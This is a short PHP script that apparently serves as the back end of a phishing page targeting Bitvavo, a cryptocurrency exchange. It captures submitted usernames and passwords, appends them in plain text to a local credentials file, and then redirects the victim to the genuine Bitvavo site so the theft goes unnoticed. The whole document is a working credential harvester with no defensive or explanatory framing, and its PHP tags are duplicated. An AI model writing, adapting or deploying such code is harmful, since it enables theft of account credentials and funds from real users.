<?php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Save credentials to a file
    $file = 'credentials.txt';
    $current = file_get_contents($file);
    $current .= "Username: " . $username . " | Password: " . $password . "\n";
    file_put_contents($file, $current);

    // Redirect to a fake "success" page
    header("Location: https://bitvavo.com");
    exit();
} else {
    echo "Invalid request method.";
}
?>
?>